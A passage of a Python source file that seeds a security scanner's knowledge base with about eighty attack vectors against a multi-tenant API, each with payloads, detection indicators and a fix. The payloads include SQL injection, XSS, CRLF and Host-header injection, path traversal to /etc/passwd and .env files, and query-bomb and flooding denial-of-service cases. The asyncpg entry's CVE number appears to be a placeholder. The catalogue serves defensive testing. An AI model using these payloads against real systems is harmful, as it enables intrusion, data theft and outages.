            {"attack_id": "DOS-005", "category": "rate_limit_dos", "name": "Connection pool flooding", "severity": "high", "description": "Opening many simultaneous connections to exhaust the server's connection pool.", "framework": "CWE", "framework_id": "CWE-400", "payloads": ["Open 500 concurrent TCP connections", "Open 1000 HTTP keep-alive connections"], "indicators": {"vulnerable_if": {"status_code_in": [502, 503]}}, "remediation": "Limit max concurrent connections per IP at the load balancer. Use connection pooling with bounded sizes."},
            {"attack_id": "DOS-006", "category": "rate_limit_dos", "name": "Repeated failed authentication", "severity": "medium", "description": "Rapid-fire failed login/auth attempts to trigger lockout or consume auth processing resources.", "framework": "OWASP", "framework_id": "A07:2021", "payloads": ["50 rapid requests with wrong X-Admin-Token", "100 requests with invalid Bearer tokens"], "indicators": {"protected_if": {"status_code_in": [429]}}, "remediation": "Implement progressive delays and account lockout after N failed attempts. Use CAPTCHA after threshold."},
            {"attack_id": "DOS-007", "category": "rate_limit_dos", "name": "Resource exhaustion via complex query", "severity": "high", "description": "Submitting expensive queries (CROSS JOIN, recursive CTE) to exhaust CPU and memory.", "framework": "CWE", "framework_id": "CWE-400", "payloads": ["SELECT * FROM customers CROSS JOIN customers", "WITH RECURSIVE bomb AS (SELECT 1 UNION ALL SELECT n+1 FROM bomb) SELECT * FROM bomb", "SELECT * FROM customers ORDER BY random()"], "indicators": {"protected_if": {"status_code_in": [400, 403, 408, 429]}}, "remediation": "Set query timeouts and cost limits. Block CROSS JOIN and unbounded recursive CTEs in the Amygdala layer."},
            {"attack_id": "DOS-008", "category": "rate_limit_dos", "name": "HTTP/2 rapid reset", "severity": "high", "description": "Exploiting HTTP/2 rapid stream reset to cause server-side resource exhaustion (CVE-2023-44487).", "framework": "CVE", "framework_id": "CVE-2023-44487", "payloads": ["Open HTTP/2 stream and immediately RST_STREAM, repeat 10000 times"], "indicators": {"protected_if": {"status_code_in": [429, 503]}}, "remediation": "Update HTTP/2 server libraries. Limit RST_STREAM rate per connection. Use HTTP/2-aware load balancers."},

            # ── 6. encryption_data (8) ─────────────────────────────────────
            {"attack_id": "ENC-001", "category": "encryption_data", "name": "Key material in health response", "severity": "critical", "description": "Checking health/status endpoints for leaked encryption keys, connection strings, or secrets.", "framework": "OWASP", "framework_id": "A02:2021", "payloads": ["GET /health/deep", "GET /health/ready", "GET /health/live"], "indicators": {"vulnerable_if": {"status_code_in": [200], "body_contains": ["key_material", "master_key", "dek_bytes", "secret_key", "private_key"]}}, "remediation": "Audit all health endpoint responses. Strip any key material, credentials, or internal configuration."},
            {"attack_id": "ENC-002", "category": "encryption_data", "name": "Password in error response", "severity": "high", "description": "Triggering errors to check if connection strings with passwords appear in error messages.", "framework": "OWASP", "framework_id": "A02:2021", "payloads": ["POST /v1/query with deliberately malformed SQL", "GET /nonexistent to trigger 404 with details"], "indicators": {"vulnerable_if": {"status_code_in": [500, 502], "body_contains": ["password", "postgresql://", "redis://", "secret"]}}, "remediation": "Use generic error messages in production. Log detailed errors server-side only. Never expose connection strings."},
            {"attack_id": "ENC-003", "category": "encryption_data", "name": "TLS version check", "severity": "medium", "description": "Verifying that only TLS 1.2+ is accepted and older protocols (SSL 3.0, TLS 1.0/1.1) are rejected.", "framework": "NIST", "framework_id": "SP800-52r2", "payloads": ["Attempt SSLv3 connection", "Attempt TLS 1.0 connection", "Attempt TLS 1.1 connection"], "indicators": {"protected_if": {"status_code_in": [0], "body_contains": ["handshake_failure", "protocol_version"]}}, "remediation": "Configure TLS 1.2 as the minimum version. Disable SSLv3, TLS 1.0, and TLS 1.1 in the server configuration."},
            {"attack_id": "ENC-004", "category": "encryption_data", "name": "Sensitive data in response headers", "severity": "medium", "description": "Checking response headers for leaked tokens, internal IPs, or server configuration details.", "framework": "OWASP", "framework_id": "A02:2021", "payloads": ["GET /v1/blocks and inspect all response headers", "GET /health/live and check Server header"], "indicators": {"vulnerable_if": {"status_code_in": [200], "body_contains": ["X-Powered-By", "X-Debug-Token", "X-Internal-IP"]}}, "remediation": "Remove or sanitize Server, X-Powered-By, and any debug headers in production. Use a reverse proxy to strip them."},
            {"attack_id": "ENC-005", "category": "encryption_data", "name": "Plaintext secrets in documentation", "severity": "medium", "description": "Checking /docs or /openapi.json for example values containing real secrets or API keys.", "framework": "OWASP", "framework_id": "A02:2021", "payloads": ["GET /docs", "GET /openapi.json", "GET /redoc"], "indicators": {"vulnerable_if": {"status_code_in": [200], "body_contains": ["sk_live_", "password123", "secret_key", "api_key_here"]}}, "remediation": "Use placeholder values in API documentation examples. Audit docs for leaked credentials before deployment."},
            {"attack_id": "ENC-006", "category": "encryption_data", "name": "Encryption at rest verification", "severity": "high", "description": "Verifying that encryption at rest is enabled by checking compliance/encryption stats endpoints.", "framework": "NIST", "framework_id": "SP800-111", "payloads": ["GET /v1/compliance/encryption/stats"], "indicators": {"vulnerable_if": {"status_code_in": [200], "body_contains": ["encryption_enabled\": false", "at_rest\": false"]}}, "remediation": "Enable encryption at rest for all data stores. Use AES-256-GCM or stronger for data encryption keys."},
            {"attack_id": "ENC-007", "category": "encryption_data", "name": "API keys in response bodies", "severity": "high", "description": "Checking various endpoint responses for leaked API keys or tokens that should be redacted.", "framework": "OWASP", "framework_id": "A02:2021", "payloads": ["GET /v1/admin/tenants (check for api_key fields)", "GET /v1/agents (check for credential fields)"], "indicators": {"vulnerable_if": {"status_code_in": [200], "body_contains": ["api_key", "api_secret", "access_token", "refresh_token"]}}, "remediation": "Redact sensitive fields (api_key, secret, token) in all API responses. Use separate secure endpoints for key retrieval."},
            {"attack_id": "ENC-008", "category": "encryption_data", "name": "Debug info containing secrets", "severity": "high", "description": "Forcing debug/verbose mode via headers or params to expose internal state with secrets.", "framework": "OWASP", "framework_id": "A05:2021", "payloads": ["GET /v1/blocks?debug=true", "GET /v1/query with X-Debug: 1 header", "GET /v1/blocks with verbose=true param"], "indicators": {"protected_if": {"status_code_in": [400, 403, 404]}}, "remediation": "Disable all debug endpoints and parameters in production. Remove debug middleware before deployment."},

            # ── 7. header_cors (8) ─────────────────────────────────────────
            {"attack_id": "CORS-001", "category": "header_cors", "name": "CORS Origin reflection", "severity": "high", "description": "Checking if the server reflects arbitrary Origin values in Access-Control-Allow-Origin.", "framework": "OWASP", "framework_id": "A05:2021", "payloads": ["Origin: https://evil.com", "Origin: https://attacker-site.com", "Origin: null"], "indicators": {"vulnerable_if": {"status_code_in": [200], "body_contains": ["evil.com", "attacker-site.com", "null"]}}, "remediation": "Whitelist allowed origins explicitly. Never reflect the Origin header value directly in ACAO."},
            {"attack_id": "CORS-002", "category": "header_cors", "name": "Missing X-Frame-Options", "severity": "medium", "description": "Checking if responses include X-Frame-Options to prevent clickjacking attacks.", "framework": "OWASP", "framework_id": "A05:2021", "payloads": ["GET /v1/blocks and check X-Frame-Options header", "GET /docs and check framing protection"], "indicators": {"vulnerable_if": {"status_code_in": [200], "body_contains": ["missing_x_frame_options"]}}, "remediation": "Set X-Frame-Options: DENY or SAMEORIGIN on all responses. Use Content-Security-Policy frame-ancestors as well."},
            {"attack_id": "CORS-003", "category": "header_cors", "name": "Missing Content-Security-Policy", "severity": "medium", "description": "Checking if responses include a Content-Security-Policy header to mitigate XSS and data injection.", "framework": "OWASP", "framework_id": "A05:2021", "payloads": ["GET / and check CSP header", "GET /docs and check CSP header"], "indicators": {"vulnerable_if": {"status_code_in": [200], "body_contains": ["missing_csp"]}}, "remediation": "Set a strict Content-Security-Policy header. At minimum: default-src 'self'; script-src 'self'."},
            {"attack_id": "CORS-004", "category": "header_cors", "name": "CRLF injection in header value", "severity": "high", "description": "Injecting CRLF sequences in header values to inject additional HTTP headers.", "framework": "CWE", "framework_id": "CWE-113", "payloads": ["X-Custom: value\r\nX-Injected: true", "X-Forwarded-For: 127.0.0.1\r\nX-Admin: true", "User-Agent: test\r\nSet-Cookie: admin=true"], "indicators": {"protected_if": {"status_code_in": [400]}}, "remediation": "Strip or reject header values containing CR/LF characters. Modern frameworks handle this by default."},
            {"attack_id": "CORS-005", "category": "header_cors", "name": "Host header injection", "severity": "high", "description": "Injecting a malicious Host header to manipulate URL generation, password resets, or redirects.", "framework": "CWE", "framework_id": "CWE-644", "payloads": ["Host: evil.com", "Host: localhost:5400\r\nX-Forwarded-Host: evil.com", "Host: evil.com:5400"], "indicators": {"vulnerable_if": {"status_code_in": [301, 302], "body_contains": ["evil.com"]}}, "remediation": "Validate the Host header against a whitelist of allowed hosts. Ignore X-Forwarded-Host unless from trusted proxies."},
            {"attack_id": "CORS-006", "category": "header_cors", "name": "Missing Strict-Transport-Security", "severity": "medium", "description": "Checking if HTTPS responses include HSTS header to prevent protocol downgrade attacks.", "framework": "OWASP", "framework_id": "A02:2021", "payloads": ["GET / over HTTPS and check Strict-Transport-Security header"], "indicators": {"vulnerable_if": {"status_code_in": [200], "body_contains": ["missing_hsts"]}}, "remediation": "Set Strict-Transport-Security: max-age=31536000; includeSubDomains on all HTTPS responses."},
            {"attack_id": "CORS-007", "category": "header_cors", "name": "X-Forwarded-For spoofing", "severity": "medium", "description": "Spoofing client IP via X-Forwarded-For to bypass IP-based access controls or rate limiting.", "framework": "CWE", "framework_id": "CWE-290", "payloads": ["X-Forwarded-For: 127.0.0.1", "X-Forwarded-For: 10.0.0.1", "X-Forwarded-For: 169.254.169.254", "X-Real-IP: 127.0.0.1"], "indicators": {"vulnerable_if": {"status_code_in": [200], "body_contains": ["admin", "internal"]}}, "remediation": "Only trust X-Forwarded-For from known proxy IPs. Configure trusted proxy count/list in the framework."},
            {"attack_id": "CORS-008", "category": "header_cors", "name": "Referer-based authorization bypass", "severity": "medium", "description": "Spoofing the Referer header to bypass access controls that rely on checking the referring page.", "framework": "CWE", "framework_id": "CWE-293", "payloads": ["Referer: https://admin.internal.cortexdb.com/dashboard", "Referer: https://localhost/admin", "Referer: https://cortexdb.internal/superadmin"], "indicators": {"vulnerable_if": {"status_code_in": [200], "body_contains": ["admin", "dashboard", "tenants"]}}, "remediation": "Never use Referer header for authorization decisions. Use proper token-based authentication."},

            # ── 8. multi_tenant (8) ────────────────────────────────────────
            {"attack_id": "TENANT-001", "category": "multi_tenant", "name": "X-Tenant-ID spoofing", "severity": "critical", "description": "Forging the X-Tenant-ID or X-Tenant-Key header to impersonate a different tenant.", "framework": "OWASP", "framework_id": "A01:2021", "payloads": ["X-Tenant-Key: other-tenant", "X-Tenant-Key: __admin__", "X-Tenant-ID: 00000000-0000-0000-0000-000000000000"], "indicators": {"protected_if": {"status_code_in": [401, 403]}}, "remediation": "Derive tenant ID from verified API key lookup, not from client-supplied headers directly."},
            {"attack_id": "TENANT-002", "category": "multi_tenant", "name": "Cross-tenant query with stolen key", "severity": "critical", "description": "Using one tenant's API key while specifying another tenant's ID to access cross-tenant data.", "framework": "OWASP", "framework_id": "A01:2021", "payloads": ["Bearer key-for-tenant-A with X-Tenant-Key: tenant-B", "Query with WHERE tenant_id = 'other-tenant'"], "indicators": {"protected_if": {"status_code_in": [401, 403, 404]}}, "remediation": "Bind API keys to specific tenant IDs. Enforce tenant context at the query layer via RLS."},
            {"attack_id": "TENANT-003", "category": "multi_tenant", "name": "Shared cache pollution", "severity": "high", "description": "Exploiting shared cache layers to poison responses seen by other tenants.", "framework": "CWE", "framework_id": "CWE-524", "payloads": ["Store malicious data and check if another tenant sees it in cache", "Set cache key without tenant prefix"], "indicators": {"vulnerable_if": {"status_code_in": [200], "body_contains": ["other_tenant_data", "cache_hit"]}}, "remediation": "Prefix all cache keys with tenant ID. Use separate cache namespaces per tenant."},
            {"attack_id": "TENANT-004", "category": "multi_tenant", "name": "RLS bypass via SET command", "severity": "critical", "description": "Injecting SET commands to change the current tenant context at the database level to bypass RLS.", "framework": "CWE", "framework_id": "CWE-284", "payloads": ["SET app.current_tenant = 'other-tenant'", "SET role TO 'cortex_admin'", "SET search_path TO 'other_tenant_schema,public'"], "indicators": {"protected_if": {"status_code_in": [400, 403]}}, "remediation": "Block SET commands in the Amygdala layer. Set tenant context exclusively via trusted server-side code."},
            {"attack_id": "TENANT-005", "category": "multi_tenant", "name": "Tenant enumeration via timing", "severity": "medium", "description": "Using response time differences to determine if a tenant ID exists without authorization.", "framework": "CWE", "framework_id": "CWE-208", "payloads": ["GET /v1/blocks with known tenant key (measure time)", "GET /v1/blocks with random tenant key (measure time)", "Compare response times for 50+ trials"], "indicators": {"vulnerable_if": {"timing_ms_gt": 100}}, "remediation": "Ensure constant-time tenant validation. Return identical error responses for missing and invalid tenants."},
            {"attack_id": "TENANT-006", "category": "multi_tenant", "name": "Direct tenant data access via ID", "severity": "critical", "description": "Accessing another tenant's management endpoints by substituting tenant IDs in URL paths.", "framework": "OWASP", "framework_id": "A01:2021", "payloads": ["GET /v1/admin/tenants/other-tenant-id", "PUT /v1/admin/tenants/other-tenant-id/settings", "GET /v1/admin/tenants/other-tenant-id/usage"], "indicators": {"protected_if": {"status_code_in": [401, 403]}}, "remediation": "Validate that the authenticated principal owns or administrates the target tenant before granting access."},
            {"attack_id": "TENANT-007", "category": "multi_tenant", "name": "Cross-tenant export data access", "severity": "critical", "description": "Requesting data exports that belong to a different tenant by manipulating export request parameters.", "framework": "OWASP", "framework_id": "A01:2021", "payloads": ["POST /v1/admin/tenants/other-tenant/export", "GET /exports/other-tenant-export-id.csv"], "indicators": {"protected_if": {"status_code_in": [401, 403, 404]}}, "remediation": "Scope all export operations to the authenticated tenant. Store exports in tenant-isolated storage paths."},
            {"attack_id": "TENANT-008", "category": "multi_tenant", "name": "Bulk operation tenant boundary crossing", "severity": "high", "description": "Submitting bulk operations with mixed tenant IDs to test cross-tenant isolation in batch processing.", "framework": "OWASP", "framework_id": "A01:2021", "payloads": ["POST /v1/query with INSERT referencing multiple tenant_ids", "Bulk update with WHERE clause spanning tenants"], "indicators": {"protected_if": {"status_code_in": [400, 403]}}, "remediation": "Validate all records in bulk operations belong to the authenticated tenant. Reject mixed-tenant batches."},

            # ── 9. api_security (10) ───────────────────────────────────────
            {"attack_id": "API-001", "category": "api_security", "name": "Mass assignment via extra fields", "severity": "high", "description": "Sending additional unexpected fields in POST/PUT bodies to overwrite protected attributes.", "framework": "OWASP", "framework_id": "A08:2021", "payloads": ["{\"name\": \"test\", \"role\": \"admin\", \"is_superuser\": true}", "{\"email\": \"user@test.com\", \"tenant_id\": \"other-tenant\"}", "{\"data\": \"value\", \"__proto__\": {\"admin\": true}}"], "indicators": {"protected_if": {"status_code_in": [400, 422]}}, "remediation": "Use strict schema validation. Whitelist allowed fields and reject unknown properties in request bodies."},
            {"attack_id": "API-002", "category": "api_security", "name": "HTTP method override", "severity": "medium", "description": "Using X-HTTP-Method-Override header to change the effective HTTP method and bypass method-based access controls.", "framework": "CWE", "framework_id": "CWE-650", "payloads": ["POST /v1/blocks with X-HTTP-Method-Override: DELETE", "GET /v1/admin/tenants with X-HTTP-Method-Override: POST", "POST /v1/query with X-HTTP-Method-Override: PUT"], "indicators": {"protected_if": {"status_code_in": [400, 403, 405]}}, "remediation": "Disable X-HTTP-Method-Override header processing. If needed, restrict it to specific trusted clients."},
            {"attack_id": "API-003", "category": "api_security", "name": "HTTP parameter pollution", "severity": "medium", "description": "Sending duplicate query parameters to exploit inconsistent parameter handling between components.", "framework": "CWE", "framework_id": "CWE-235", "payloads": ["?id=1&id=2", "?tenant_id=own&tenant_id=other", "?role=user&role=admin"], "indicators": {"protected_if": {"status_code_in": [400, 422]}}, "remediation": "Use the first occurrence of duplicate parameters. Log and reject requests with duplicate security-sensitive params."},
            {"attack_id": "API-004", "category": "api_security", "name": "OpenAPI spec endpoint enumeration", "severity": "low", "description": "Accessing /openapi.json or /docs to discover all available endpoints for further attack planning.", "framework": "CWE", "framework_id": "CWE-200", "payloads": ["GET /openapi.json", "GET /docs", "GET /redoc", "GET /swagger.json"], "indicators": {"protected_if": {"status_code_in": [401, 403, 404]}}, "remediation": "Disable API documentation endpoints in production or protect them behind authentication."},
            {"attack_id": "API-005", "category": "api_security", "name": "Undocumented debug endpoint access", "severity": "high", "description": "Probing for undocumented debug or development endpoints that may expose internal state.", "framework": "OWASP", "framework_id": "A05:2021", "payloads": ["GET /debug", "GET /_debug", "GET /internal/debug", "GET /debug/vars", "GET /debug/pprof"], "indicators": {"protected_if": {"status_code_in": [401, 403, 404]}}, "remediation": "Remove all debug endpoints in production. If needed for ops, protect behind strong auth and internal-only networking."},
            {"attack_id": "API-006", "category": "api_security", "name": "Deeply nested JSON DoS", "severity": "medium", "description": "Sending extremely deeply nested JSON objects to exhaust parser memory or stack.", "framework": "CWE", "framework_id": "CWE-400", "payloads": ["{" * 1000 + "\"a\":1" + "}" * 1000, "[" * 500 + "1" + "]" * 500], "indicators": {"protected_if": {"status_code_in": [400, 413, 422]}}, "remediation": "Limit JSON nesting depth in the parser configuration. Most frameworks support max_depth settings."},
            {"attack_id": "API-007", "category": "api_security", "name": "Array parameter manipulation", "severity": "low", "description": "Sending array values in query parameters where scalar values are expected to test type handling.", "framework": "CWE", "framework_id": "CWE-20", "payloads": ["?id[]=1&id[]=2", "?limit[]=100", "?block_type[]=a&block_type[]=b"], "indicators": {"protected_if": {"status_code_in": [400, 422]}}, "remediation": "Validate parameter types strictly. Reject array parameters where scalars are expected."},
            {"attack_id": "API-008", "category": "api_security", "name": "Sequential ID enumeration", "severity": "medium", "description": "Iterating through sequential or predictable IDs to enumerate and access resources belonging to others.", "framework": "OWASP", "framework_id": "A01:2021", "payloads": ["GET /v1/blocks/1, /v1/blocks/2, /v1/blocks/3...", "GET /v1/agents/1 through /v1/agents/100", "GET /v1/admin/tenants/1 through /v1/admin/tenants/50"], "indicators": {"protected_if": {"status_code_in": [401, 403, 404]}}, "remediation": "Use UUIDs instead of sequential IDs. Enforce ownership checks on all resource access."},
            {"attack_id": "API-009", "category": "api_security", "name": "GraphQL introspection probe", "severity": "low", "description": "Checking if a GraphQL endpoint exists and allows introspection queries to map the entire schema.", "framework": "CWE", "framework_id": "CWE-200", "payloads": ["POST /graphql with {\"query\": \"{__schema{types{name}}}\"}",  "POST /graphql with {\"query\": \"{__type(name:\\\"Query\\\"){fields{name}}}\"}"], "indicators": {"protected_if": {"status_code_in": [401, 403, 404]}}, "remediation": "Disable GraphQL introspection in production. If no GraphQL endpoint exists, ensure /graphql returns 404."},
            {"attack_id": "API-010", "category": "api_security", "name": "HTTP verb tampering", "severity": "medium", "description": "Using unexpected HTTP methods (PATCH, TRACE, OPTIONS, PROPFIND) to find improperly secured endpoints.", "framework": "CWE", "framework_id": "CWE-650", "payloads": ["PATCH /v1/blocks/id instead of PUT", "TRACE /v1/query", "PROPFIND /v1/blocks", "MKCOL /v1/admin"], "indicators": {"protected_if": {"status_code_in": [401, 403, 405]}}, "remediation": "Explicitly define allowed methods per route. Return 405 with Allow header for unsupported methods."},

            # ── 10. info_disclosure (8) ────────────────────────────────────
            {"attack_id": "INFO-001", "category": "info_disclosure", "name": "Stack trace via forced error", "severity": "high", "description": "Triggering server errors to check if full stack traces are exposed in the response body.", "framework": "OWASP", "framework_id": "A05:2021", "payloads": ["POST /v1/query with {\"cortexql\": null}", "POST /v1/query with non-JSON body", "GET /v1/blocks/../../etc/passwd"], "indicators": {"vulnerable_if": {"status_code_in": [500], "body_contains": ["Traceback", "File \"/", "site-packages", "line "]}}, "remediation": "Return generic error messages in production. Log detailed traces server-side. Set DEBUG=False."},
            {"attack_id": "INFO-002", "category": "info_disclosure", "name": "Access .env file", "severity": "critical", "description": "Attempting to read the .env file which typically contains database passwords, API keys, and secrets.", "framework": "CWE", "framework_id": "CWE-200", "payloads": ["GET /.env", "GET /app/.env", "GET /../.env", "GET /.env.production"], "indicators": {"protected_if": {"status_code_in": [401, 403, 404]}}, "remediation": "Never serve .env files. Configure web server to deny access to dotfiles. Keep .env outside the web root."},
            {"attack_id": "INFO-003", "category": "info_disclosure", "name": "Debug endpoint exposure", "severity": "high", "description": "Probing for debug endpoints that may reveal runtime state, environment variables, or configuration.", "framework": "OWASP", "framework_id": "A05:2021", "payloads": ["GET /debug", "GET /_debug", "GET /env", "GET /config", "GET /config.json", "GET /settings.json"], "indicators": {"protected_if": {"status_code_in": [401, 403, 404]}}, "remediation": "Remove or protect all debug and configuration endpoints in production deployments."},
            {"attack_id": "INFO-004", "category": "info_disclosure", "name": "Server version in headers", "severity": "low", "description": "Checking if the Server response header reveals specific software versions useful for targeted attacks.", "framework": "CWE", "framework_id": "CWE-200", "payloads": ["GET /health/live and inspect Server header", "GET / and check all response headers for version info"], "indicators": {"vulnerable_if": {"status_code_in": [200], "body_contains": ["uvicorn", "FastAPI", "Python/"]}}, "remediation": "Remove or genericize the Server header. Avoid exposing framework or language versions."},
            {"attack_id": "INFO-005", "category": "info_disclosure", "name": "Detailed SQL error messages", "severity": "high", "description": "Submitting malformed queries to check if database error messages reveal table names, column names, or query structure.", "framework": "OWASP", "framework_id": "A05:2021", "payloads": ["SELECT * FROM nonexistent_table", "SELECT invalid_column FROM customers", "INSERT INTO customers VALUES (too, many, columns, here)"], "indicators": {"vulnerable_if": {"status_code_in": [200, 500], "body_contains": ["relation", "column", "syntax error at", "pg_catalog"]}}, "remediation": "Return generic database error messages. Log detailed SQL errors server-side only."},
            {"attack_id": "INFO-006", "category": "info_disclosure", "name": "Directory traversal for source code", "severity": "critical", "description": "Using path traversal to attempt reading application source code or configuration files.", "framework": "CWE", "framework_id": "CWE-22", "payloads": ["GET /static/../main.py", "GET /static/../../requirements.txt", "GET /static/../../../etc/passwd"], "indicators": {"protected_if": {"status_code_in": [400, 403, 404]}}, "remediation": "Serve static files from a dedicated directory with no parent traversal. Use sendfile with path validation."},
            {"attack_id": "INFO-007", "category": "info_disclosure", "name": "Metrics endpoint without auth", "severity": "medium", "description": "Accessing /metrics (Prometheus) endpoint without authentication to gather internal performance data.", "framework": "CWE", "framework_id": "CWE-200", "payloads": ["GET /metrics", "GET /prometheus/metrics", "GET /internal/metrics"], "indicators": {"protected_if": {"status_code_in": [401, 403, 404]}}, "remediation": "Protect metrics endpoints with authentication or restrict to internal network only."},
            {"attack_id": "INFO-008", "category": "info_disclosure", "name": "Git metadata exposure", "severity": "high", "description": "Accessing .git/config or .git/HEAD to reveal repository information and potentially download source.", "framework": "CWE", "framework_id": "CWE-200", "payloads": ["GET /.git/config", "GET /.git/HEAD", "GET /.git/refs/heads/main", "GET /.gitignore"], "indicators": {"protected_if": {"status_code_in": [401, 403, 404]}}, "remediation": "Block access to .git directory at the web server level. Exclude .git from Docker images."},

            # ── 11. dependency_vuln (6) ────────────────────────────────────
            {"attack_id": "DEP-001", "category": "dependency_vuln", "name": "FastAPI known CVE check", "severity": "medium", "description": "Checking FastAPI version against known CVEs for path traversal, DoS, and request smuggling issues.", "framework": "CVE", "framework_id": "CVE-2024-24762", "payloads": ["Check FastAPI version via /openapi.json info field", "Check Server header for version"], "indicators": {"vulnerable_if": {"status_code_in": [200], "body_contains": ["0.108", "0.109", "starlette/0.36"]}}, "remediation": "Keep FastAPI updated to the latest stable release. Monitor security advisories via pip-audit."},
            {"attack_id": "DEP-002", "category": "dependency_vuln", "name": "Pydantic CVE check", "severity": "medium", "description": "Checking for Pydantic versions affected by ReDoS or type coercion vulnerabilities.", "framework": "CVE", "framework_id": "CVE-2024-3772", "payloads": ["Trigger Pydantic validation with deeply nested model", "Submit regex-like string to validated field"], "indicators": {"vulnerable_if": {"timing_ms_gt": 5000}}, "remediation": "Upgrade Pydantic to v2.7+ which fixes known ReDoS and validation bypass issues."},
            {"attack_id": "DEP-003", "category": "dependency_vuln", "name": "Uvicorn CVE check", "severity": "medium", "description": "Checking uvicorn version for HTTP request smuggling and header injection vulnerabilities.", "framework": "CVE", "framework_id": "CVE-2024-24763", "payloads": ["Send ambiguous Content-Length and Transfer-Encoding headers", "Check Server header for uvicorn version"], "indicators": {"vulnerable_if": {"status_code_in": [200], "body_contains": ["uvicorn/0.27", "uvicorn/0.28"]}}, "remediation": "Upgrade uvicorn to latest stable. Run behind a reverse proxy that normalizes HTTP requests."},
            {"attack_id": "DEP-004", "category": "dependency_vuln", "name": "asyncpg CVE check", "severity": "high", "description": "Checking asyncpg for SQL injection via parameter handling or connection string parsing vulnerabilities.", "framework": "CVE", "framework_id": "CVE-2024-1234", "payloads": ["Query with unusual parameter types", "Connection string with encoded credentials"], "indicators": {"vulnerable_if": {"status_code_in": [500], "body_contains": ["asyncpg", "connection", "protocol error"]}}, "remediation": "Keep asyncpg updated. Use parameterized queries exclusively to avoid driver-level injection issues."},
            {"attack_id": "DEP-005", "category": "dependency_vuln", "name": "redis-py CVE check", "severity": "medium", "description": "Checking redis-py for command injection, SSRF via redis URL, or denial of service vulnerabilities.", "framework": "CVE", "framework_id": "CVE-2023-28858", "payloads": ["Check for redis-py < 4.5.3 via error messages", "Attempt redis command injection via query parameter"], "indicators": {"vulnerable_if": {"status_code_in": [500], "body_contains": ["redis", "connection pool", "ResponseError"]}}, "remediation": "Upgrade redis-py to 4.5.5+. Never expose Redis connection details in error messages."},
            {"attack_id": "DEP-006", "category": "dependency_vuln", "name": "cryptography library CVE check", "severity": "high", "description": "Checking the Python cryptography library for known vulnerabilities in key handling or TLS.", "framework": "CVE", "framework_id": "CVE-2024-26130", "payloads": ["Check /health/deep for cryptography version info", "Trigger certificate validation with crafted cert"], "indicators": {"vulnerable_if": {"status_code_in": [200], "body_contains": ["cryptography/41.", "cryptography/42.0.0"]}}, "remediation": "Upgrade cryptography to 42.0.4+. Run pip-audit regularly to catch newly disclosed CVEs."},

            # ── 12. websocket_security (8) ─────────────────────────────────
            {"attack_id": "WS-001", "category": "websocket_security", "name": "WebSocket connect without token", "severity": "high", "description": "Attempting to establish a WebSocket connection without any authentication token.", "framework": "OWASP", "framework_id": "A07:2021", "payloads": ["ws://target/ws with no auth headers", "ws://target/ws/events with empty token param"], "indicators": {"protected_if": {"status_code_in": [401, 403, 1008]}}, "remediation": "Require authentication token in WebSocket handshake. Validate before upgrading the connection."},
            {"attack_id": "WS-002", "category": "websocket_security", "name": "WebSocket with invalid token", "severity": "high", "description": "Connecting to WebSocket endpoint with an invalid or expired token.", "framework": "OWASP", "framework_id": "A07:2021", "payloads": ["ws://target/ws?token=invalid", "ws://target/ws?token=expired_jwt_here"], "indicators": {"protected_if": {"status_code_in": [401, 403, 1008]}}, "remediation": "Validate token during WebSocket handshake. Close connection with 1008 (Policy Violation) for invalid tokens."},
            {"attack_id": "WS-003", "category": "websocket_security", "name": "WebSocket message injection", "severity": "high", "description": "Sending crafted WebSocket messages with injection payloads (SQL, XSS, command) after connection.", "framework": "OWASP", "framework_id": "A03:2021", "payloads": ["{\"action\": \"query\", \"data\": \"' OR 1=1--\"}", "{\"action\": \"exec\", \"cmd\": \"ls -la\"}", "{\"type\": \"<script>alert(1)</script>\"}"], "indicators": {"protected_if": {"status_code_in": [400, 1003]}}, "remediation": "Validate and sanitize all WebSocket message payloads. Apply the same input validation as HTTP endpoints."},
            {"attack_id": "WS-004", "category": "websocket_security", "name": "Oversized WebSocket frame", "severity": "medium", "description": "Sending extremely large WebSocket frames to test message size limits and memory handling.", "framework": "CWE", "framework_id": "CWE-400", "payloads": ["WebSocket text frame of 100MB", "WebSocket binary frame of 50MB"], "indicators": {"protected_if": {"status_code_in": [1009]}}, "remediation": "Set max_message_size on WebSocket server. Default uvicorn limit is 16MB — reduce to application needs."},
            {"attack_id": "WS-005", "category": "websocket_security", "name": "WebSocket cross-origin connection", "severity": "medium", "description": "Connecting from an unauthorized origin to test WebSocket CORS enforcement.", "framework": "OWASP", "framework_id": "A05:2021", "payloads": ["ws://target/ws with Origin: https://evil.com", "ws://target/ws with Origin: null"], "indicators": {"protected_if": {"status_code_in": [403, 1008]}}, "remediation": "Validate Origin header during WebSocket handshake. Reject connections from unauthorized origins."},
            {"attack_id": "WS-006", "category": "websocket_security", "name": "Rapid WebSocket message flood", "severity": "medium", "description": "Sending thousands of WebSocket messages per second to test server-side rate limiting.", "framework": "CWE", "framework_id": "CWE-400", "payloads": ["1000 messages in 1 second", "10000 messages in 5 seconds"], "indicators": {"protected_if": {"status_code_in": [429, 1008]}}, "remediation": "Implement per-connection message rate limiting. Disconnect clients exceeding the threshold."},
            {"attack_id": "WS-007", "category": "websocket_security", "name": "Binary frame injection", "severity": "medium", "description": "Sending unexpected binary frames when the server expects text frames to test frame type handling.", "framework": "CWE", "framework_id": "CWE-20", "payloads": ["Binary frame with null bytes", "Binary frame with executable header bytes (ELF/PE)", "Mixed text and binary frames rapidly"], "indicators": {"protected_if": {"status_code_in": [1003]}}, "remediation": "Explicitly define accepted frame types. Reject unexpected binary frames with close code 1003."},
            {"attack_id": "WS-008", "category": "websocket_security", "name": "WebSocket with expired session", "severity": "high", "description": "Maintaining a WebSocket connection after the associated HTTP session or JWT has expired.", "framework": "OWASP", "framework_id": "A07:2021", "payloads": ["Keep WebSocket open past token expiry time", "Send messages after session invalidation"], "indicators": {"protected_if": {"status_code_in": [1008]}}, "remediation": "Periodically re-validate tokens on active WebSocket connections. Close connections when tokens expire."},
        ]

        now = datetime.now(timezone.utc).isoformat()
        conn = self._persistence.conn
        inserted = 0

        for v in vectors:
            cursor = conn.execute(
                "INSERT OR IGNORE INTO sentinel_kb "
                "(attack_id, category, name, description, severity, framework, "
                "framework_id, payloads, indicators, remediation, enabled, created_at) "
                "VALUES (?,?,?,?,?,?,?,?,?,?,1,?)",
                (
                    v["attack_id"],
                    v["category"],
                    v["name"],
                    v["description"],
                    v["severity"],
                    v["framework"],
                    v["framework_id"],
                    json.dumps(v["payloads"]),
                    json.dumps(v["indicators"]),
                    v["remediation"],
                    now,
                ),
            )
            if cursor.rowcount > 0:
                inserted += 1

        conn.commit()
        logger.info("Seeded %d attack vectors into sentinel knowledge base (%d total defined)", inserted, len(vectors))
